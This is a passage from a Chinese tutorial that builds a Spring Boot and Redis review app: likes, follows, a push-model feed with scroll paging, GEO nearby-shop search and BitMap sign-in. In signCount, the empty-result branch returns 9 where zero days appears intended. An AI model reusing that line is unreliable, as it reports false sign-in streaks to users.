    // 获取登录用户
    UserDTO user = UserHolder.getUser();
    if (user == null) {
        // 用户未登录，无需查询是否点赞（修改之前的BUG）
        return;
    }
    Long userId = user.getId();
    // 判断当前登录用户是否已经点赞
    String key = BLOG_LIKED_KEY + blog.getId();
    Double score = stringRedisTemplate.opsForZSet().score(key, userId.toString());
    blog.setIsLike(score != null);
}

@Override
public Result likeBlog(Long id) {
    // 获取登录用户
    Long userId = UserHolder.getUser().getId();
    // 判断当前登录用户是否已经点赞
    String key = BLOG_LIKED_KEY + id;
    Double score = stringRedisTemplate.opsForZSet().score(key, userId.toString());
    if (score == null) {
        // 如果未点赞，可以点赞
        // 数据库点赞数 + 1
        boolean isSuccess = update().setSql("liked = liked + 1").eq("id", id).update();
        // 保存用户到Redis的set集合
        if (isSuccess) {
            stringRedisTemplate.opsForZSet().add(key, userId.toString(), System.currentTimeMillis());
        }
    } else {
        // 如果已点赞，取消点赞
        // 数据库点赞数 - 1
        boolean isSuccess = update().setSql("liked = liked - 1").eq("id", id).update();
        // 把用户从Redis的set集合移除
        if (isSuccess) {
            stringRedisTemplate.opsForZSet().remove(key, userId.toString());
        }
    }
    return Result.ok();
}
```

在`BlogController`中添加方法：

```java
@GetMapping("/likes/{id}")
public Result queryBlogLikes(@PathVariable("id") Long id) {
    return blogService.queryBlogLikes(id);
}
```

在`IBlogService`中添加方法：

```java
Result queryBlogLikes(Long id);
```

对应的实现类：

```java
import java.util.Set;
import java.util.Collections;
import java.util.stream.Collectors;
import cn.hutool.core.bean.BeanUtil;

@Override
public Result queryBlogLikes(Long id) {
    String key = BLOG_LIKED_KEY + id;
    // 查询top5的点赞用户
    Set<String> top5 = stringRedisTemplate.opsForZSet().range(key, 0, 4);
    if (top5 == null || top5.isEmpty()) {
        return Result.ok(Collections.emptyList());
    }
    // 解析出其中的用户id
    List<Long> ids = top5.stream().map(Long::valueOf).collect(Collectors.toList());
    // 根据用户id查询用户
    List<UserDTO> userDTOS = userService.listByIds(ids)
            .stream()
            .map(user -> BeanUtil.copyProperties(user, UserDTO.class))
            .collect(Collectors.toList());
    // 返回
    return Result.ok(userDTOS);
}
```

由于`userService.listByIds`采用的是`IN`查询，查询结果不按照给定顺序排列，因此这里修改对应的SQL如下：

```java
import cn.hutool.core.util.StrUtil;

@Override
public Result queryBlogLikes(Long id) {
    String key = BLOG_LIKED_KEY + id;
    // 查询top5的点赞用户
    Set<String> top5 = stringRedisTemplate.opsForZSet().range(key, 0, 4);
    if (top5 == null || top5.isEmpty()) {
        return Result.ok(Collections.emptyList());
    }
    // 解析出其中的用户id
    List<Long> ids = top5.stream().map(Long::valueOf).collect(Collectors.toList());
    String idStr = StrUtil.join(",", ids);
    // 根据用户id查询用户
    List<UserDTO> userDTOS = userService.query()
        .in("id", ids).last("ORDER BY FIELD(id," + idStr + ")").list()
        .stream()
        .map(user -> BeanUtil.copyProperties(user, UserDTO.class))
        .collect(Collectors.toList());
    // 返回
    return Result.ok(userDTOS);
}
```

## 好友关注

### 关注和取关

在探店图文的详情页面中，可以关注发布笔记的作者。

下面实现关注和取关功能，需求：基于该表数据结构，实现两个接口：

- 关注和取关接口。
- 判断是否关注的接口。

关注是`User`之间的关系，是博主与粉丝的关系，数据库中有一张tb_follow表来标识。注意: 这里需要把主键修改为自增长，简化开发。

创建`FollowController`：

```java
package com.hmdp.controller;

import com.hmdp.dto.Result;
import com.hmdp.service.IFollowService;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;

@RestController
@RequestMapping("/follow")
public class FollowController {

    @Resource
    private IFollowService followService;

    @PutMapping("/{id}/{isFollow}")
    public Result follow(@PathVariable("id") Long followUserId, @PathVariable("isFollow") Boolean isFollow) {
        return followService.follow(followUserId, isFollow);
    }

    @GetMapping("/or/not/{id}")
    public Result isFollow(@PathVariable("id") Long followUserId) {
        return followService.isFollow(followUserId);
    }

}
```

对应的服务类：

```java
package com.hmdp.service;

import com.hmdp.dto.Result;
import com.hmdp.entity.Follow;
import com.baomidou.mybatisplus.extension.service.IService;

public interface IFollowService extends IService<Follow> {

    Result follow(Long followUserId, Boolean isFollow);

    Result isFollow(Long followUserId);
}
```

```java
package com.hmdp.service.impl;

import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.hmdp.dto.Result;
import com.hmdp.entity.Follow;
import com.hmdp.mapper.FollowMapper;
import com.hmdp.service.IFollowService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.hmdp.utils.UserHolder;
import org.springframework.stereotype.Service;

@Service
public class FollowServiceImpl extends ServiceImpl<FollowMapper, Follow> implements IFollowService {

    @Override
    public Result follow(Long followUserId, Boolean isFollow) {
        // 获取登录用户
        Long userId = UserHolder.getUser().getId();
        // 判断到底是关注还是取关
        if (isFollow) {
            // 关注，新增数据
            Follow follow = new Follow();
            follow.setUserId(userId);
            follow.setFollowUserId(followUserId);
            save(follow);
        } else {
            // 取关，删除
            remove(new QueryWrapper<Follow>()
                    .eq("user_id", userId).eq("follow_user_id", followUserId));
        }
        return Result.ok();
    }

    @Override
    public Result isFollow(Long followUserId) {
        // 获取登录用户
        Long userId = UserHolder.getUser().getId();
        // 查询是否关注
        Integer count = query().eq("user_id", userId).eq("follow_user_id", followUserId).count();
        // 判断
        return Result.ok(count > 0);
    }
}
```

`Follow`的定义如下：

```java
package com.hmdp.entity;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;
import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.experimental.Accessors;

import java.io.Serializable;
import java.time.LocalDateTime;

@Data
@EqualsAndHashCode(callSuper = false)
@Accessors(chain = true)
@TableName("tb_follow")
public class Follow implements Serializable {

    private static final long serialVersionUID = 1L;

    /**
     * 主键
     */
    @TableId(value = "id", type = IdType.AUTO)
    private Long id;

    /**
     * 用户id
     */
    private Long userId;

    /**
     * 关联的用户id
     */
    private Long followUserId;

    /**
     * 创建时间
     */
    private LocalDateTime createTime;


}
```

`FollowMapper`的定义如下：

```java
package com.hmdp.mapper;

import com.hmdp.entity.Follow;
import com.baomidou.mybatisplus.core.mapper.BaseMapper;

public interface FollowMapper extends BaseMapper<Follow> {}
```

### 共同关注

点击博主头像，可以进入博主首页。

博主个人首页依赖两个接口：

- 根据id查询`User`信息。

- 根据id查询博主的探店笔记。

在`UserController`中添加方法：

```java
import cn.hutool.core.bean.BeanUtil;

/**
 *  根据id查询用户
 */
@GetMapping("/{id}")
public Result queryUserById(@PathVariable("id") Long userId){
    // 查询详情
    User user = userService.getById(userId);
    if (user == null) {
        return Result.ok();
    }
    UserDTO userDTO = BeanUtil.copyProperties(user, UserDTO.class);
    // 返回
    return Result.ok(userDTO);
}
```

在`BlogController`中添加方法：

```java
@GetMapping("/of/user")
public Result queryBlogByUserId(
        @RequestParam(value = "current", defaultValue = "1") Integer current,
        @RequestParam("id") Long id) {
    // 根据用户查询
    Page<Blog> page = blogService.query()
            .eq("user_id", id).page(new Page<>(current, SystemConstants.MAX_PAGE_SIZE));
    // 获取当前页数据
    List<Blog> records = page.getRecords();
    return Result.ok(records);
}
```

这样，进入博主首页，就可以看到博主信息以及他的探店笔记了。

下面实现共同关注功能，需求：

- 利用Redis中恰当的数据结构，实现共同关注功能。在博主个人页面展示出当前用户与博主的共同好友。

修改`FollowServiceImpl`的`follow`方法，用Redis保存关注的用户id：

```java
import org.springframework.data.redis.core.StringRedisTemplate;
import javax.annotation.Resource;

@Resource
private StringRedisTemplate stringRedisTemplate;

@Override
public Result follow(Long followUserId, Boolean isFollow) {
    // 获取登录用户
    Long userId = UserHolder.getUser().getId();
    String key = "follows:" + userId;
    // 判断到底是关注还是取关
    if (isFollow) {
        // 关注，新增数据
        Follow follow = new Follow();
        follow.setUserId(userId);
        follow.setFollowUserId(followUserId);
        boolean isSuccess = save(follow);
        if (isSuccess) {
            // 把关注用户的id放入Redis的set集合
            stringRedisTemplate.opsForSet().add(key, followUserId.toString());
        }
    } else {
        // 取关，删除
        boolean isSuccess = remove(new QueryWrapper<Follow>()
                .eq("user_id", userId).eq("follow_user_id", followUserId));
        if (isSuccess) {
            // 把关注用户的id从Redis集合中移除
            stringRedisTemplate.opsForSet().remove(key, followUserId.toString());
        }
    }
    return Result.ok();
}
```

在`FollowController`类中添加方法：

```java
@GetMapping("/common/{id}")
public Result followCommons(@PathVariable("id") Long id) {
    return followService.followCommons(id);
}
```

对应的服务类中添加方法：

```java
Result followCommons(Long id);
```

```java
import com.hmdp.service.IUserService;
import java.util.Set;
import java.util.Collections;
import java.util.List;
import java.util.stream.Collectors;
import cn.hutool.core.bean.BeanUtil;
import com.hmdp.dto.UserDTO;

@Resource
private IUserService userService;

@Override
public Result followCommons(Long id) {
    // 获取当前用户
    Long userId = UserHolder.getUser().getId();
    String key = "follows:" + userId;
    // 求交集
    String key2 = "follows:" + id;
    Set<String> intersect = stringRedisTemplate.opsForSet().intersect(key, key2);
    if (intersect == null || intersect.isEmpty()) {
        // 无交集
        return Result.ok(Collections.emptyList());
    }
    // 解析id集合
    List<Long> ids = intersect.stream().map(Long::valueOf).collect(Collectors.toList());
    // 查询用户
    List<UserDTO> users = userService.listByIds(ids)
            .stream()
            .map(user -> BeanUtil.copyProperties(user, UserDTO.class))
            .collect(Collectors.toList());
    return Result.ok(users);
}
```

### 关注推送

关注推送也叫做Feed流，直译为投喂。为用户持续的提供“沉浸式”的体验，通过无限下拉刷新获取新的信息。

传统模式下，用户需要通过搜索引擎、贴吧等检索内容，自己思考、分析、鉴别什么样的内容才是自己想要的。而Feed流则由应用程序自动根据用户行为匹配更适合用户的内容，减少用户查找、思考、分析的过程，节省用户时间（然而实际效果未必如此）。

Feed流产品有两种常见模式：

- Timeline：不做内容筛选，简单的按照内容发布时间排序，常用于好友或关注。例如朋友圈。

  - 优点：信息全面，不会有缺失。并且实现也相对简单

  - 缺点：信息噪音较多，用户不一定感兴趣，内容获取效率低

- 智能排序：利用智能算法屏蔽掉违规的、用户不感兴趣的内容。推送用户感兴趣信息来吸引用户。

  - 优点：投喂用户感兴趣信息，用户粘度很高，容易沉迷。

  - 缺点：如果算法不精准，可能起到反作用。

本例中的个人页面，是基于关注的好友来做Feed流，因此采用Timeline的模式。该模式的实现方案有三种：

- 拉模式：也叫读扩散。用户发送消息到发件箱，并附带一个时间戳（不断递增）；每个用户有一个收件箱，当用户要读取消息时，他将其关注的用户的发件箱中的消息都拉取到自己的收件箱中，并按照时间戳排序。优点是节省内存空间，因为收件箱一般为空，只有读取时才会将消息拉取到收件箱，读完后消息被清理，因此大多时候消息只保留一份（在发件箱中）；缺点在于每次读取消息都要重新拉取消息并排序，因此读取延迟较高。
- 推模式：也叫写扩散。用户没有发件箱，所发消息直接推送到所有粉丝的收件箱中并排序。它的优缺点与拉模式相反。
- 推拉结合模式：也叫做读写混合，兼具推和拉两种模式的优点。普通用户（粉丝数较少）采用推模式发送消息；大V（粉丝数较多）采用推模式将消息发给他的活跃粉丝，采用拉模式将消息发送到收件箱中并由他的普通粉丝读取。这样普通粉丝只有某些大V的消息需要拉取，且频率低，可以接受。

总结如下：

|              | 拉模式   | 推模式            | 推拉结合              |
| ------------ | -------- | ----------------- | --------------------- |
| 写比例       | 低       | 高                | 中                    |
| 读比例       | 高       | 低                | 中                    |
| 用户读取延迟 | 高       | 低                | 低                    |
| 实现难度     | 复杂     | 简单              | 很复杂                |
| 使用场景     | 很少使用 | 用户量少、没有大V | 过千万的用户量，有大V |

由于本项目用户不多，没有大V，因此使用推模式。

下面基于推模式实现关注推送功能，需求：

- 修改新增探店笔记的业务，在保存blog到数据库的同时，推送到粉丝的收件箱。
- 收件箱满足可以根据时间戳排序，必须用Redis的数据结构实现。
- 查询收件箱数据时，可以实现分页查询。

`List`与`SortedSet`都能高效实现上述的排序与分页功能。

Feed流中的数据会不断更新，所以数据的角标也在变化，因此不能采用传统的分页模式。

例如，假设`page = 1, size = 5`，Feed流中目前存在10条数据，则第一页的数据索引为$10\leftarrow6$，如果现在又插入一条数据（索引为11），则第二页的数据索引为$6\leftarrow2$，出现重复读取的情况。因此这里采用Feed流的滚动分页模式：记录每次查询的最后一条记录，下次从此位置开始查询，第一次查询前的最后一条记录记为$\infty$。

`List`基于下标查询数据，不支持滚动分页，而`SortedSet`支持（基于`score`值范围查询而非排名查询）。

修改`BlogController`的`saveBlog`方法：

```java
@PostMapping
public Result saveBlog(@RequestBody Blog blog) {
    return blogService.saveBlog(blog);
}
```

在`IBlogService`中添加方法：

```java
Result saveBlog(Blog blog);
```

对应的实现方法：

```java
import com.hmdp.service.IFollowService;
import static com.hmdp.utils.RedisConstants.FEED_KEY;
import com.hmdp.entity.Follow;

@Resource
private IFollowService followService;

@Override
public Result saveBlog(Blog blog) {
    // 获取登录用户
    UserDTO user = UserHolder.getUser();
    blog.setUserId(user.getId());
    // 保存探店笔记
    boolean isSuccess = save(blog);
    if (!isSuccess) {
        return Result.fail("新增笔记失败！");
    }
    // 查询笔记作者的所有粉丝
    List<Follow> follows = followService.query().eq("follow_user_id", user.getId()).list();
    // 推送笔记id给所有粉丝
    for (Follow follow : follows) {
        // 获取粉丝id
        Long userId = follow.getUserId();
        // 推送
        String key = FEED_KEY + userId;
        stringRedisTemplate.opsForZSet().add(key, blog.getId().toString(), System.currentTimeMillis());
    }
    // 返回id
    return Result.ok(blog.getId());
}
```

下面实现关注推送页面的分页查询，需求：

- 在个人主页的“关注”卡片中，查询并展示推送的`Blog`信息。

基于`score`值范围查询可以使用命令`ZREVRANGEBYSCORE`命令，对于第一页（指的是第一次查询），指定的时间戳范围为最大时间（可以使用当前时间戳）$\leftarrow$最小值（可以使用0，并不关心最小值），且偏移量为0；对于其他页，指定的时间戳范围为上一页最小时间$\leftarrow$最小值，且偏移量为`score`等于上一页最小时间的元素的数量。

前端发送请求时会携带时间戳（`lastId`）与偏移量（`offset`）（查询第一页不用`offset`，时间戳为前端获取的当前时间）以便后端实现分页查询。同时，除了请求查询第一页外，时间戳与偏移量又由后端指定并返回给前端。

创建`ScrollResult`类，用于封装返回结果：

```java
package com.hmdp.dto;

import lombok.Data;

import java.util.List;

@Data
public class ScrollResult {
    private List<?> list;
    private Long minTime;
    private Integer offset;
}
```

在`BlogController`中添加方法：

```java
@GetMapping("/of/follow")
public Result queryBlogOfFollow(@RequestParam("lastId") Long max, @RequestParam(value = "offset", defaultValue = "0") Integer offset) {
    return blogService.queryBlogOfFollow(max, offset);
}
```

在`IBlogService`中添加方法：

```java
Result queryBlogOfFollow(Long max, Integer offset);
```

对应的实现类：

```java
import org.springframework.data.redis.core.ZSetOperations;
import java.util.ArrayList;
import com.hmdp.dto.ScrollResult;

@Override
public Result queryBlogOfFollow(Long max, Integer offset) {
    // 获取当前用户
    Long userId = UserHolder.getUser().getId();
    // 查询收件箱
    String key = FEED_KEY + userId;
    Set<ZSetOperations.TypedTuple<String>> typedTuples = stringRedisTemplate.opsForZSet()
            .reverseRangeByScoreWithScores(key, 0, max, offset, 2);
    // 非空判断
    if (typedTuples == null || typedTuples.isEmpty()) {
        return Result.ok();
    }
    // 解析数据：blogId、minTime（时间戳）、offset
    List<Long> ids = new ArrayList<>(typedTuples.size());
    long minTime = 0;
    int os = 0;
    for (ZSetOperations.TypedTuple<String> tuple : typedTuples) {
        // 获取id
        ids.add(Long.valueOf(tuple.getValue()));
        // 获取分数（时间戳）
        long time = tuple.getScore().longValue();
        if (time == minTime) {
            os++;
        } else {
            minTime = time;
            os = 1;
        }
    }
    // 根据id查询blog（不能使用listByIds，因为结果无序）
    String idStr = StrUtil.join(",", ids);
    List<Blog> blogs = query().in("id", ids).last("ORDER BY FIELD(id," + idStr + ")").list();
    for (Blog blog : blogs) {
        // 查询blog有关的用户
        queryBlogUser(blog);
        // 查询blog是否被点赞
        isBlogLiked(blog);
    }
    // 封装并返回
    ScrollResult r = new ScrollResult();
    r.setList(blogs);
    r.setOffset(os);
    r.setMinTime(minTime);
    return Result.ok(r);
}
```

此时，当前端点击“关注”卡片，就能看到推送信息，且下划到底部会显示下一页信息，上划到顶部则刷新推送信息，得到最新信息。

## 附近商户

### GEO数据结构

GEO就是Geolocation的简写形式，代表地理坐标。Redis在3.2版本中加入了对GEO的支持，允许存储地理坐标信息，帮助我们根据经纬度来检索数据。常见的命令有：

| 命令             | 说明                                                         |
| ---------------- | ------------------------------------------------------------ |
| `GEOADD`         | 添加地理空间信息，包含：经度（`longitude`）、纬度（`latitude`）、值（`member`） |
| `GEODIST`        | 计算指定的两个点之间的距离并返回                             |
| `GEOHASH`        | 将指定`member`的坐标转为哈希字符串形式并返回                 |
| `GEOPOS`         | 返回指定`member`的坐标                                       |
| `GEORADIUS`      | 指定圆心、半径，找到该圆内包含的所有`member`，并按照与圆心之间的距离排序后返回。6.2以后已废弃 |
| `GEOSEARCH`      | 在指定范围内搜索`member`，并按照与指定点之间的距离排序后返回。范围可以是圆形或矩形。6.2新功能 |
| `GEOSEARCHSTORE` | 与`GEOSEARCH`功能一致，不过可以把结果存储到一个指定的键。 6.2新功能 |


注意，无法使用`help @geo`查看GEO相关命令组，只能查看GEO相关的具体命令。

GEO底层使用的`SortedSet`，其中`value`表示`member`，经纬度则转换为`score`存储。

### 附近商户搜索

在首页中点击某个频道，即可看到频道下的商户。商户可以按照商户类型、距离、人气、评分等进行筛选或排序（这里要实现默认按照距离排序）。

为了实现根据距离排序功能，需要使用GEO保存商户的经纬度与值（即商户id）。同时为了实现类型过滤，可以按照商户类型做分组，类型相同的商户作为同一组，以`typeId`为键存入同一个GEO集合中即可。

批量导入商铺信息到Redis：

```java
package com.hmdp;

import com.hmdp.entity.Shop;
import com.hmdp.service.impl.ShopServiceImpl;
import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.data.geo.Point;
import org.springframework.data.redis.connection.RedisGeoCommands;
import org.springframework.data.redis.core.StringRedisTemplate;

import javax.annotation.Resource;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;
import static com.hmdp.utils.RedisConstants.SHOP_GEO_KEY;

@SpringBootTest
class HmDianPingApplicationTests {

    @Resource
    private ShopServiceImpl shopService;

    @Resource
    private StringRedisTemplate stringRedisTemplate;

    @Test
    public void loadShopData() {
        // 查询店铺信息
        List<Shop> list = shopService.list();
        // 把店铺分组，按照typeId分组，typeId一致的放到一个集合
        Map<Long, List<Shop>> map = list.stream().collect(Collectors.groupingBy(Shop::getTypeId));
        // 分批完成写入Redis
        for (Map.Entry<Long, List<Shop>> entry : map.entrySet()) {
            // 获取类型id
            Long typeId = entry.getKey();
            String key = SHOP_GEO_KEY + typeId;
            // 获取同类型的店铺的集合
            List<Shop> value = entry.getValue();
            List<RedisGeoCommands.GeoLocation<String>> locations = new ArrayList<>(value.size());
            // 写入Redis
            for (Shop shop : value) {
                locations.add(new RedisGeoCommands.GeoLocation<>(
                        shop.getId().toString(),
                        new Point(shop.getX(), shop.getY())
                ));
            }
            stringRedisTemplate.opsForGeo().add(key, locations);
        }
    }

}
```

SpringDataRedis的2.3.9.RELEASE版本并不支持Redis 6.2提供的`GEOSEARCH`命令，因此需要排除spring-data-redis与io.lettuce依赖，并引入2.6.2版本的spring-data-redis与6.1.6.RELEASE版本的lettuce-core（原来是5.3.7.RELEASE版本）。

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-data-redis</artifactId>
    <exclusions>
        <exclusion>
            <artifactId>spring-data-redis</artifactId>
            <groupId>org.springframework.data</groupId>
        </exclusion>
        <exclusion>
            <artifactId>lettuce-core</artifactId>
            <groupId>io.lettuce</groupId>
        </exclusion>
    </exclusions>
</dependency>
<dependency>
    <groupId>org.springframework.data</groupId>
    <artifactId>spring-data-redis</artifactId>
    <version>2.6.2</version>
</dependency>
<dependency>
    <groupId>io.lettuce</groupId>
    <artifactId>lettuce-core</artifactId>
    <version>6.1.6.RELEASE</version>
</dependency>
```

下面首先实现`ShopController`的基本功能：

```java
package com.hmdp.controller;


import cn.hutool.core.util.StrUtil;
import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import com.hmdp.dto.Result;
import com.hmdp.entity.Shop;
import com.hmdp.service.IShopService;
import com.hmdp.utils.SystemConstants;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;

@RestController
@RequestMapping("/shop")
public class ShopController {

    @Resource
    private IShopService shopService;

    /**
     * 根据id查询商铺信息
     * @param id 商铺id
     * @return 商铺详情数据
     */
    @GetMapping("/{id}")
    public Result queryShopById(@PathVariable("id") Long id) {
        return shopService.queryById(id);
    }

    /**
     * 新增商铺信息
     * @param shop 商铺数据
     * @return 商铺id
     */
    @PostMapping
    public Result saveShop(@RequestBody Shop shop) {
        // 写入数据库
        shopService.save(shop);
        // 返回店铺id
        return Result.ok(shop.getId());
    }

    /**
     * 更新商铺信息
     * @param shop 商铺数据
     * @return 无
     */
    @PutMapping
    public Result updateShop(@RequestBody Shop shop) {
        // 写入数据库
        return shopService.update(shop);
    }

    /**
     * 根据商铺类型分页查询商铺信息
     * @param typeId 商铺类型
     * @param current 页码
     * @return 商铺列表
     */
    @GetMapping("/of/type")
    public Result queryShopByType(
            @RequestParam("typeId") Integer typeId,
            @RequestParam(value = "current", defaultValue = "1") Integer current
    ) {
        // 根据类型分页查询
        Page<Shop> page = shopService.query()
                .eq("type_id", typeId)
                .page(new Page<>(current, SystemConstants.DEFAULT_PAGE_SIZE));
        // 返回数据
        return Result.ok(page.getRecords());
    }

    /**
     * 根据商铺名称关键字分页查询商铺信息
     * @param name 商铺名称关键字
     * @param current 页码
     * @return 商铺列表
     */
    @GetMapping("/of/name")
    public Result queryShopByName(
            @RequestParam(value = "name", required = false) String name,
            @RequestParam(value = "current", defaultValue = "1") Integer current
    ) {
        // 根据类型分页查询
        Page<Shop> page = shopService.query()
                .like(StrUtil.isNotBlank(name), "name", name)
                .page(new Page<>(current, SystemConstants.MAX_PAGE_SIZE));
        // 返回数据
        return Result.ok(page.getRecords());
    }
}
```

下面修改`ShopController`的`queryShopByType`方法：

```java
@GetMapping("/of/type")
public Result queryShopByType(
        @RequestParam("typeId") Integer typeId,
        @RequestParam(value = "current", defaultValue = "1") Integer current,
        @RequestParam(value = "x", required = false) Double x,
        @RequestParam(value = "y", required = false) Double y
) {
    return shopService.queryShopByType(typeId, current, x, y);
}
```

在服务类中添加方法：

```java
Result queryShopByType(Integer typeId, Integer current, Double x, Double y);
```

```java
import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import org.springframework.data.geo.Distance;
import org.springframework.data.geo.GeoResult;
import org.springframework.data.geo.GeoResults;
import org.springframework.data.redis.connection.RedisGeoCommands;
import org.springframework.data.redis.domain.geo.GeoReference;
import com.hmdp.utils.SystemConstants;
import cn.hutool.core.util.StrUtil;
import java.util.*;

@Override
public Result queryShopByType(Integer typeId, Integer current, Double x, Double y) {
    // 判断是否需要根据坐标查询
    if (x == null || y == null) {
        // 不需要坐标查询， 按数据库查询
        Page<Shop> page = query()
                .eq("type_id", typeId)
                .page(new Page<>(current, SystemConstants.DEFAULT_PAGE_SIZE));
        // 返回数据
        return Result.ok(page.getRecords());
    }
    // 计算分页参数
    int from = (current - 1) * SystemConstants.DEFAULT_PAGE_SIZE;
    int end = current * SystemConstants.DEFAULT_PAGE_SIZE;
    // 查询Redis，按照距离排序、分页。结果：shopId、distance
    String key = SHOP_GEO_KEY + typeId;
    GeoResults<RedisGeoCommands.GeoLocation<String>> results = stringRedisTemplate.opsForGeo()
            .search(
                    key,
                    GeoReference.fromCoordinate(x, y),
                    new Distance(5000),  // 默认单位为米，将来搜索结果的单位也是米
                    RedisGeoCommands.GeoSearchCommandArgs.newGeoSearchArgs().includeDistance().limit(end)
            );
    // 解析出id
    if (results == null) {
        return Result.ok(Collections.emptyList());
    }
    List<GeoResult<RedisGeoCommands.GeoLocation<String>>> list = results.getContent();
    if (list.size() <= from) {
        // 没有下一页了，结束
        return Result.ok(Collections.emptyList());
    }
    // 截取from - end的部分
    List<Long> ids = new ArrayList<>(list.size());
    Map<String, Distance> distanceMap = new HashMap<>(list.size());
    list.stream().skip(from).forEach(result -> {
        // 截取店铺id
        String shopIdStr = result.getContent().getName();
        ids.add(Long.valueOf(shopIdStr));
        // 获取距离
        Distance distance = result.getDistance();
        distanceMap.put(shopIdStr, distance);
    });
    // 根据id查询Shop
    String idStr = StrUtil.join(",", ids);
    List<Shop> shops = query().in("id", ids).last("ORDER BY FIELD(id," + idStr + ")").list();
    for (Shop shop : shops) {
        shop.setDistance(distanceMap.get(shop.getId().toString()).getValue());
    }
    // 返回
    return Result.ok(shops);
}
```

## 用户签到

### BitMap用法

假如我们用一张表来存储用户签到信息，其结构应该如下：

```sql
CREATE TABLE `tb_sign` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键',
  `user_id` bigint(20) unsigned NOT NULL COMMENT '用户id',
  `year` year(4) NOT NULL COMMENT '签到的年',
  `month` tinyint(2) NOT NULL COMMENT '签到的月',
  `date` date NOT NULL COMMENT '签到的日期',
  `is_backup` tinyint(1) unsigned DEFAULT NULL COMMENT '是否补签',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 ROW_FORMAT=COMPACT;
```

假如有$1000$万用户，平均每人每年签到次数为$10$次，则这张表一年的数据量为1亿条。

每签到一次需要使用$8+8+1+1+3+1$共$22$字节的内存，一个月则最多需要600多字节。

更好的方式是按月来统计用户签到信息，签到记录为1，未签到则记录为0。

把每一个bit位对应当月的每一天，形成了映射关系。用0和1标识业务状态，这种思路就称为**位图（BitMap）**。

Redis中是利用`String`类型数据结构实现`BitMap`，因此最大上限是512M，转换为bit则是$2^{32}$个bit位。

`BitMap`的操作命令有：

| 命令           | 描述                                                         |
| -------------- | ------------------------------------------------------------ |
| `SETBIT`       | 向指定位置（offset）存入一个0或1                             |
| `GETBIT`       | 获取指定位置（offset）的bit值                                |
| `BITCOUNT`     | 统计`BitMap`中值为1的bit位的数量                             |
| `BITFIELD`     | 操作（查询、修改、自增）`BitMap`中bit数组中的指定位置（offset）的值（通常使用它实现批量查询，例如`BITFIELD bm GET u2 0`表示获取`BitMap` `bm`从第0位开始的两个bit，并以无符号十进制的形式返回） |
| `BITFIELD_RO ` | 获取`BitMap`中bit数组，并以十进制形式返回                    |
| `BITOP`        | 将多个`BitMap`的结果做位运算（与 、或、异或）                |
| `BITPOS`       | 查找bit数组中指定范围内第一个0或1出现的位置                  |

### 签到功能

需求：实现签到接口，将当前用户当天签到信息保存到Redis中。

提示：因为`BitMap`底层是基于`String`数据结构，因此其操作也都封装在字符串相关操作中了。

在`UserController`中添加方法：

```java
@PostMapping("/sign")
public Result sign() {
    return userService.sign();
}
```

相应的服务类方法及其实现：

```java
Result sign();
```

```java
import com.hmdp.utils.UserHolder;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

@Override
public Result sign() {
    // 获取当前登录用户
    Long userId = UserHolder.getUser().getId();
    // 获取日期
    LocalDateTime now = LocalDateTime.now();
    // 拼接键
    String keySuffix = now.format(DateTimeFormatter.ofPattern(":yyyyMM"));
    String key = USER_SIGN_KEY + userId + keySuffix;
    // 获取今天是本月的第几天
    int dayOfMonth = now.getDayOfMonth();
    // 写入Redis
    stringRedisTemplate.opsForValue().setBit(key, dayOfMonth - 1, true);
    return Result.ok();
}
```

### 签到统计

从最后一次签到开始向前统计，直到遇到第一次未签到为止，计算总的签到次数，就是连续签到天数。

可以通过`BITFIELD key GET u[dayOfMonth] 0`命令，得到本月到今天为止的所有签到数据。

如何从后向前遍历每个bit位？与1做与运算，就能得到最后一个bit位。随后右移1位，下一个bit位就成为了最后一个bit位。

下面实现实现签到统计功能：实现接口，统计当前用户截止当前时间在本月的连续签到天数。

在`UserController`中添加方法：

```java
@GetMapping("/sign/count")
public Result signCount() {
    return userService.signCount();
}
```

相应的服务类方法及其实现：

```java
Result signCount();
```

```java
import java.util.List;
import org.springframework.data.redis.connection.BitFieldSubCommands;

@Override
public Result signCount() {
    // 获取当前登录用户
    Long userId = UserHolder.getUser().getId();
    // 获取日期
    LocalDateTime now = LocalDateTime.now();
    // 拼接键
    String keySuffix = now.format(DateTimeFormatter.ofPattern(":yyyyMM"));
    String key = USER_SIGN_KEY + userId + keySuffix;
    // 获取今天是本月的第几天
    int dayOfMonth = now.getDayOfMonth();
    // 获取本月截止今天为止的所有的签到记录，返回的是一个十进制的数字
    List<Long> result = stringRedisTemplate.opsForValue().bitField(
            key,
            BitFieldSubCommands.create()
                    .get(BitFieldSubCommands.BitFieldType.unsigned(dayOfMonth)).valueAt(0)
    );  // 因为bitField可以同时执行GET、SET等多个命令，因此返回一个集合
    if (result == null || result.isEmpty()) {
        // 没有任何签到结果
        return Result.ok(9);
    }
    Long num = result.get(0);
    if (num == null || num == 0) {
        return Result.ok(0);
    }
    // 循环遍历
    int count = 0;
    while (true) {
        // 让这个数字与1做与运算，得到数字的最后一个bit位
        if ((num & 1) == 0) {
            // 如果为0，说明未签到，结束
            break;
        } else {
            // 如果不为0，说明已签到，计数器+1
            count++;
        }
        // 把数字右移一位，抛弃最后一个bit位，继续下一个bit位
        num >>>= 1;
    }
    return Result.ok(count);
}
```

## UV统计

### HyperLogLog用法

首先我们搞懂两个概念：

- UV：全称Unique Visitor，也叫独立访客量，是指通过互联网访问、浏览这个网页的自然人。1天内同一个用户多次访问该网站，只记录1次。
- PV：全称Page View，也叫页面访问量或点击量，用户每访问网站的一个页面，记录1次PV，用户多次打开页面，则记录多次PV。往往用来衡量网站的流量。

